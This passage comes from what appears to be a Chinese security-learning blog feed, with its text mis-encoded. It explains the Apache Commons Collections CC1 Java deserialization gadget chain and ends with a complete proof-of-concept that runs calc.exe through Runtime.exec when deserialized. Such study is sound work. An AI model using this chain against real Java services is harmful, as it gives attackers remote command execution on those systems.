alt="QQæˆªå›¾20220302153927"></p><p>ç„¶åå°†ä¸‹è½½çš„å‹ç¼©åŒ…ï¼Œæ‰¾åˆ°sunæ–‡ä»¶å¤¹ï¼ŒåŠ å…¥è‡³srcã€‚å³å¯ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725733.png" alt="QQæˆªå›¾20220302153927"></p><p>ç„¶åå°±æ˜¯åœ¨ideaä¸­å¯¼å…¥ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725699.png" alt="QQæˆªå›¾20220302154312"></p><p>æ¬§å…‹ï¼<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725960.png" alt="QQæˆªå›¾20220302154736"></p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">objectInputStream.read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformedMap</span>.</span></span>set<span class="hljs-constructor">Value()</span><br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h3 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h3><p>æœ€å¤šçš„å°±æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œè¿›å»ç§ç§ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021616758.png" alt="QQæˆªå›¾20220302161553"></p><p>ä»ä¸Šå¾€ä¸‹çœ‹åˆ©ç”¨é“¾å­ã€‚ï¼ˆæŒ‡å®ç°äº†transformæ¥å£çš„ï¼‰</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021622247.png" alt="QQæˆªå›¾20220302162237"></p><p><strong>ä¼ å…¥çš„æ•°ç»„ï¼Œåœ¨transformæ–¹æ³•ä¸­ï¼Œå‰ä¸€æ¬¡transformå‡½æ•°çš„è¿”å›å€¼ï¼Œä¼šä½œä¸ºä¸‹ä¸€æ¬¡transformå‡½æ•°çš„objectå‚æ•°è¾“å…¥ã€‚</strong></p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725974.png" alt="QQæˆªå›¾20220302162414"></p><p>ç»™äº†ä»€ä¹ˆå°±è¿”å›ä»€ä¹ˆã€‚</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725553.png" alt="QQæˆªå›¾20220302162610"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725101.png" alt="QQæˆªå›¾20220302162616"></p><p>è¿™é‡Œå°±æ¯”è¾ƒæœ‰æ„æ€äº†ã€‚ç›´æ¥åˆ©ç”¨åå°„äº†ã€‚è€Œä¸”ä¼ å…¥çš„å‚æ•°æ˜¯å¯ä»¥æ§åˆ¶çš„ã€‚</p><h3 id="åˆ©ç”¨invokerTransformerå¼¹ä¸ªè®¡ç®—å™¨"><a href="#åˆ©ç”¨invokerTransformerå¼¹ä¸ªè®¡ç®—å™¨" class="headerlink" title="åˆ©ç”¨invokerTransformerå¼¹ä¸ªè®¡ç®—å™¨"></a>åˆ©ç”¨invokerTransformerå¼¹ä¸ªè®¡ç®—å™¨</h3><h4 id="å¤ä¹ åå°„"><a href="#å¤ä¹ åå°„" class="headerlink" title="å¤ä¹ åå°„"></a>å¤ä¹ åå°„</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> aClass.getDeclaredConstructor();<br>declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>aClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(declaredConstructor.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(runtime);<br></code></pre></td></tr></table></figure><p>å¦‚æœçœ‹ä¸æ‡‚è¿™ä¸ªä¸ºä»€ä¹ˆè¿™ä¹ˆæ„é€ å»ºè®®å¤šçœ‹ï¼Œä¸Šé¢<code>invokerTransformer</code>çš„å®ç°æ–¹æ³•ã€‚æˆ–è€…å›å»å¤ä¹ åå°„ã€‚</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725975.png" alt="QQæˆªå›¾20220302165423"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021648812.png" alt="QQæˆªå›¾20220302164819"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725010.png" alt="QQæˆªå›¾20220302164829"></p><p>å¾ˆæœ‰æ„æ€ï¼Œå³ä½¿æ˜¯è¿™é‡Œç”¨protectä¿æŠ¤äº†æ­¤æ–¹æ³•ï¼Œä½†æ˜¯è¿˜ç»™äº†å¦å¤–çš„å®ç°ä¼ å…¥å‚æ•°æ–¹æ³•ã€‚è¿™é‡Œä¸å°±æ˜¯ä¼ å…¥å€¼ï¼Œç„¶åå°±ä¼šç»§ç»­è°ƒç”¨<code>invokerTransformer</code>ã€‚</p><p>ç›¸å½“äºä¼ å…¥ä¸€ä¸ª<code>valueTransformer</code>ï¼Œè€Œè¿™ä¸ªå€¼æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œåˆšå¥½å¯ä»¥ä¼ å…¥<strong>invokerTransformer</strong></p><p>æ„é€ ï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>  <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>  HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>  TransformedMap.decorate(objectObjectHashMap,<span class="hljs-literal">null</span>,exec);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œå´æ²¡æœ‰è§¦å‘<code>checkSetValue</code>æ–¹æ³•ã€‚</p><h3 id="checkSetValue"><a href="#checkSetValue" class="headerlink" title="checkSetValue"></a>checkSetValue</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021703497.png" alt="QQæˆªå›¾20220302170322"></p><p>çœŸçš„å·§ï¼Œåªæœ‰ä¸€å¤„ä½¿ç”¨äº†å®ƒã€‚å»çœ‹çœ‹ã€‚å…ˆå»è®­ç»ƒäº†ã€‚ï¼ˆä¸»è¦æ˜¯æ†‹ä¸ä½å°¿äº†ã€‚è°ˆäº†æ‹çˆ±ä¹Ÿè¦ç»å¸¸é”»ç‚¼ï¼Œæ°´äº†é˜Ÿé‡Œå¥½å‡ æ¬¡è®­ç»ƒäº†ã€‚å“ˆå“ˆå“ˆ~~ï¼‰<br>22.13æ‰èµ¶åˆ°å®éªŒå®¤ã€‚<br>ç»§ç»­å†™å§ã€‚<br>ç»§ç»­è·Ÿè¿›ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725179.png" alt="QQæˆªå›¾20220302221426"></p><p>å¾ˆæ˜¾ç„¶è¿™é‡Œè¦æ‰¾<code>setValue</code>ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°ï¼Œè¿™ä¸¤ç±»éƒ½ç»§æ‰¿äº†<code>AbstractInputCheckedMapDecorator</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725383.png" alt="QQæˆªå›¾20220302221854"></p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨ä½¿ç”¨entryéå†èµ‹å€¼è¢«ä¿®é¥°è¿‡çš„ç±»èµ‹å€¼æ—¶ï¼Œä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚è€Œè¿™ä¸ªçˆ¶ç±»åˆšå¥½åˆæ˜¯è¿™é‡Œçš„<code>MapEntry</code>çš„ç±»ã€‚çœŸçš„å¤ªå·§äº†ã€‚</p><h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>      <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>      HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>      objectObjectHashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>      Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, exec);<br>      <span class="hljs-keyword">for</span>(Map.Entry entry:decorate.entrySet())&#123;<br>          entry.setValue(runtime);<br>      &#125;<br><br></code></pre></td></tr></table></figure><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>è®°å¾—ä¹‹å‰åŠ å…¥çš„åŒ…å—ï¼Ÿè¿™é‡Œå…¶å®å°±å¾ˆå‡‘å·§ã€‚å¾ˆæœ‰æ„æ€ã€‚åˆšå¥½<code>AnnotationInvocationHandler</code>é‡Œé¢çš„<code>readObjetc</code>å°½ç„¶è°ƒç”¨äº†<code>setValue</code></p><p>è€Œä¸”è¿™ä¸ª<code>readObject</code>åˆšå¥½å®Œæˆäº†éå†æ•°ç»„çš„åŠŸèƒ½ã€‚è¿˜å¯ä»¥ååºåˆ—ã€‚è¾¾åˆ°æ¼æ´çš„æ•ˆæœã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725232.png" alt="QQæˆªå›¾20220302223706"></p><p>ç„¶åçœ‹çœ‹å®ƒçš„æ„é€ å‡½æ•°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203022239939.png" alt="QQæˆªå›¾20220302223929"></p><p>è¿™é‡Œå€¼å¾—æ³¨æ„<strong>ä½œç”¨åŸŸ</strong>ï¼Œä¹‹å‰æ–‡ç« æœ‰è®²ã€‚<br><strong>Annotation</strong>ï¼šæ³¨è§£ç±»ã€‚<br><strong>memberValues</strong>ï¼šå¯æ§å€¼ã€‚ä¼ å…¥<code>decorate</code>ã€‚<br>ç„¶åæˆ‘ä»¬è§£å†³ä¸€ä¸‹<code>AnnotationInvocationHandler</code>ä¸­çš„é™åˆ¶æ¡ä»¶ã€‚<br><strong>ä¸¤ä¸ª<code>if</code>å’Œä¸å¯æ§åˆ¶çš„ä¼ å…¥<code>setValue</code>çš„å€¼</strong></p><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031629397.png" alt="QQæˆªå›¾20220303162858"></p><p><strong>ç¬¬ä¸€ä¸ªif</strong>ï¼šè¿™é‡Œå°±æ˜¯è¦æ‰¾ä¸€ä¸ªæ³¨è§£ç±»ï¼Œå¹¶ä¸”æœ‰å®ç°æ–¹æ³•ã€‚</p><p>æ³¨è§£ç±»ä¸­ä¸¤ä¸ªæ³¨è§£ï¼Œéƒ½å®ç°äº†<strong>valueï¼ˆï¼‰</strong>æ–¹æ³•ã€‚<br><strong>@Target</strong>å’Œ**@Retention**</p><p><strong>ç¬¬äºŒä¸ªifï¼š</strong>åˆ¤æ–­ä¸¤ä¸ªç±»å‹æ˜¯å¦èƒ½å¤Ÿå¼ºè½¬</p><h4 id="ä¸å¯æ§åˆ¶çš„ä¼ å…¥setValueçš„å€¼"><a href="#ä¸å¯æ§åˆ¶çš„ä¼ å…¥setValueçš„å€¼" class="headerlink" title="ä¸å¯æ§åˆ¶çš„ä¼ å…¥setValueçš„å€¼"></a>ä¸å¯æ§åˆ¶çš„ä¼ å…¥<code>setValue</code>çš„å€¼</h4><p>åˆ©ç”¨<strong>ConstantTransformer</strong>ã€‚ç›´æ¥ </p><h3 id="è§£å†³Runtimeç±»ä¸å¯ä»¥åºåˆ—åŒ–"><a href="#è§£å†³Runtimeç±»ä¸å¯ä»¥åºåˆ—åŒ–" class="headerlink" title="è§£å†³Runtimeç±»ä¸å¯ä»¥åºåˆ—åŒ–"></a>è§£å†³Runtimeç±»ä¸å¯ä»¥åºåˆ—åŒ–</h3><p>å·§çš„æ˜¯ï¼ŒRuntimeçš„classæ˜¯å¯ä»¥åºåˆ—åŒ–çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">runtimeClass</span> <span class="hljs-operator">=</span> Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> runtime.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>exec.invoke(invoke,<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p><code>**Object invoke = runtime.invoke(null, null);**</code><br>ç›¸å½“äºæ˜¯è·å–åˆ°äº†Runtimeè¿™ä¸ªå¯¹è±¡ã€‚</p><p>ç„¶åå°±å»æ„é€ åˆ°<strong>invokerTransformer</strong>ä¸­å»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(runtime);<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(invoke);<br></code></pre></td></tr></table></figure><h3 id="åˆ©ç”¨ChainedTransformer"><a href="#åˆ©ç”¨ChainedTransformer" class="headerlink" title="åˆ©ç”¨ChainedTransformer"></a>åˆ©ç”¨ChainedTransformer</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">InvokerTransformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>       &#125;;<br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>       chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><h2 id="å®Œæ•´POC"><a href="#å®Œæ•´POC" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc1Finsh</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br><br>       Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>       &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        objectObjectHashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> aClass.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, decorate);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ccé“¾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TemplatesImplåŠ è½½å­—èŠ‚ç </title>
    <link href="/2022/03/01/TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2022/03/01/TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
